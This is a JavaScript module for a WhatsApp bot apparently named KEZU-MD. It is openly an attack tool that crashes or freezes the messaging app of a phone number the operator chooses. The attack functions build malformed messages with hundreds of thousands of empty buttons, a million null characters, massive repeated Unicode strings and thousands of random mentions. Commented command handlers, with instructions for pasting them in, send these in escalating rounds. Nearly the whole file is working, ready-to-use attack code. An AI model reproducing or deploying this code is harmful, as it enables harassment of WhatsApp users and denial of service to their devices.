// ============================================================
//          💀 KEZU-MD GOODBYE / CRASH ATTACK MODULE
//       vajiraofc-baileys compatible | OWNER ONLY
// ============================================================
//
//  COMMANDS:
//    .gb <number>       — Normal  (Combo + VvvXxxAaa + Crashard)
//    .crash <number>    — alias for .gb
//    .gb2 <number>      — Heavy   (15+ messages, 3 phases)
//    .heavy <number>    — alias for .gb2
//    .destroy <number>  — alias for .gb2
//    .gb3 <number>      — Ultimate (30+ messages, 5 rounds)
//    .ultimate <number> — alias for .gb3
//    .max <number>      — alias for .gb3
//
// ============================================================

const {
  generateWAMessageFromContent,
  delay,
} = require('@whiskeysockets/baileys');

// ============================================================
//                    💀 ATTACK FUNCTIONS
// ============================================================

async function _atkVvvXxxAaa(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999, height: 9999, width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "Haii!",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: { text: "VxA" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    const Vmsg = generateWAMessageFromContent(target, msg, {});
    await sock.relayMessage(target, Vmsg.message, { messageId: Vmsg.key.id });
    await delay(800);

    const VxDell = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "(VxA)" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    const Vcrb = generateWAMessageFromContent(target, VxDell, {});
    await sock.relayMessage(target, Vcrb.message, { messageId: Vcrb.key.id });
    console.log("✅ VvvXxxAaa → " + target);
    return true;
  } catch(e) { console.error("❌ VvvXxxAaa:", e.message); return false; }
}

async function _atkCrashard(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𝖷𝟩 | 𝟦𝗌𝖾𝗉-𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    console.log("✅ Crashard → " + target);
    return true;
  } catch(e) { console.error("❌ Crashard:", e.message); return false; }
}

async function _atkCallInvisible(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "KEZU-MD", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          },
          contextInfo: {
            participant: { jid: target },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    };
    await sock.relayMessage("status@broadcast", msg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {},
        content: [{
          tag: "mentioned_users", attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });
    console.log("✅ CallInvisible → " + target);
    return true;
  } catch(e) { console.error("❌ CallInvisible:", e.message); return false; }
}

async function _atkForceFreeze(sock, target) {
  try {
    const msg = {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "KEZU-MD Destroyed" + "ꦾ".repeat(77777),
        publisher: "KEZU-MD",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        },
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log("✅ ForceFreeze → " + target);
    return true;
  } catch(e) { console.error("❌ ForceFreeze:", e.message); return false; }
}

async function _atkBlank1(sock, target) {
  try {
    const anta   = 'ោ៝'.repeat(20000);
    const nyocot = 'ꦾ'.repeat(20000);
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1234567891234@newsletter",
        newsletterName: "KEZU-MD" + 'ោ៝'.repeat(20000),
        caption: "Halo" + anta + nyocot + 'ោ៝'.repeat(20000),
        inviteExpiration: "90000",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    console.log("✅ Blank1 → " + target);
    return true;
  } catch(e) { console.error("❌ Blank1:", e.message); return false; }
}

async function _atkCombo(sock, target) {
  try {
    for (let i = 0; i < 5; i++) {
      await _atkCallInvisible(sock, target);
      await _atkForceFreeze(sock, target);
      await _atkBlank1(sock, target);
      await delay(300);
    }
    console.log("✅ Combo → " + target);
    return true;
  } catch(e) { console.error("❌ Combo:", e.message); return false; }
}

// ============================================================
//              💀 SWITCH CASES  (paste into your switch block)
// ============================================================
//
//  HOW TO USE:
//  1. Copy everything ABOVE this comment into pair.js near the
//     other module-level helper functions.
//  2. Copy the SWITCH CASES below and paste them inside your
//     switch(command) { ... } block.
//
// ─────────────────────────────────────────────────────────────
//
//        case 'gb':
//        case 'crash': {
//          await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `💀 *GOODBYE CRASH*\n\n*Usage:*\n.gb <number>\n\n*Example:*\n.gb 94770000000\n\n*Attacks:* Combo + VvvXxxAaa + Crashard`
//          }, { quoted: msg });
//          try {
//            const _gbNum = args[0].replace(/[^0-9]/g, '');
//            if (_gbNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gbTarget = _gbNum + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gbNum}\n⚡ *Attacking...*` }, { quoted: msg });
//            await _atkCombo(socket, _gbTarget);
//            await delay(2000);
//            await _atkVvvXxxAaa(socket, _gbTarget);
//            await delay(2000);
//            await _atkCrashard(socket, _gbTarget);
//            await socket.sendMessage(sender, { text: `✅ *Attack completed on ${_gbNum}*\n\n💀 *KEZU-MD*` }, { quoted: msg });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
//        case 'gb2':
//        case 'heavy':
//        case 'destroy': {
//          await socket.sendMessage(sender, { react: { text: '🔥', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `🔥 *HEAVY GOODBYE*\n\n*Usage:*\n.gb2 <number>\n\n*Example:*\n.gb2 94770000000\n\n*⚡ Sends 15+ heavy messages*`
//          }, { quoted: msg });
//          try {
//            const _gb2Num = args[0].replace(/[^0-9]/g, '');
//            if (_gb2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gb2Target = _gb2Num + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb2Num}\n⚡ *Heavy attack initiated...*\n\n⏳ Sending 15+ crash messages...` }, { quoted: msg });
//            await socket.sendMessage(sender, { text: `🔥 *Phase 1/3:* Sending 3 Combo attacks...` }, { quoted: msg });
//            for (let i = 0; i < 3; i++) { await _atkCombo(socket, _gb2Target); await delay(1000); }
//            await socket.sendMessage(sender, { text: `🔥 *Phase 2/3:* Sending 3 VvvXxxAaa attacks...` }, { quoted: msg });
//            for (let i = 0; i < 3; i++) { await _atkVvvXxxAaa(socket, _gb2Target); await delay(1000); }
//            await socket.sendMessage(sender, { text: `🔥 *Phase 3/3:* Sending 5 Crashard attacks...` }, { quoted: msg });
//            for (let i = 0; i < 5; i++) { await _atkCrashard(socket, _gb2Target); await delay(800); }
//            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
//            const _gb2Final = {
//              viewOnceMessage: {
//                message: {
//                  interactiveMessage: {
//                    body: { text: "💀 KEZU-MD ULTIMATE CRASH 💀\n" + "𑇂𑆵𑆴𑆿".repeat(100000) + "\n𝖷𝟩 | 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
//                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
//                  }
//                }
//              }
//            };
//            await socket.relayMessage(_gb2Target, _gb2Final, { participant: { jid: _gb2Target } });
//            await socket.sendMessage(sender, { text: `✅ *Heavy attack completed on ${_gb2Num}*\n\n🔥 *KEZU-MD ULTIMATE*` }, { quoted: msg });
//            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
//        case 'gb3':
//        case 'ultimate':
//        case 'max': {
//          await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `💥 *ULTIMATE GOODBYE*\n\n*Usage:*\n.gb3 <number>\n\n*Example:*\n.gb3 94770000000\n\n*⚡ Sends 30+ heavy messages*`
//          }, { quoted: msg });
//          try {
//            const _gb3Num = args[0].replace(/[^0-9]/g, '');
//            if (_gb3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gb3Target = _gb3Num + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb3Num}\n⚡ *ULTIMATE attack initiated...*\n\n⏳ Sending 30+ crash messages...` }, { quoted: msg });
//            for (let i = 0; i < 5; i++) {
//              await socket.sendMessage(sender, { text: `🔥 *Round ${i+1}/5:* Sending all attacks...` }, { quoted: msg });
//              await _atkCombo(socket, _gb3Target); await delay(1000);
//              await _atkVvvXxxAaa(socket, _gb3Target); await delay(1000);
//              await _atkCrashard(socket, _gb3Target); await delay(1000);
//            }
//            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
//            const _gb3Final = {
//              viewOnceMessage: {
//                message: {
//                  interactiveMessage: {
//                    body: { text: "💀 KEZU-MD MAXIMUM OVERDRIVE 💀\n" + "𑇂𑆵𑆴𑆿".repeat(200000) + "\n𝖷𝟩 | 𝖴𝗅𝗍𝗂𝗆𝖺𝗍𝖾 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
//                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
//                  }
//                }
//              }
//            };
//            await socket.relayMessage(_gb3Target, _gb3Final, { participant: { jid: _gb3Target } });
//            await socket.sendMessage(sender, { text: `✅ *ULTIMATE attack completed on ${_gb3Num}*\n\n💥 *KEZU-MD MAXIMUM POWER*` }, { quoted: msg });
//            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
// ============================================================

module.exports = {
  _atkVvvXxxAaa,
  _atkCrashard,
  _atkCallInvisible,
  _atkForceFreeze,
  _atkBlank1,
  _atkCombo
};
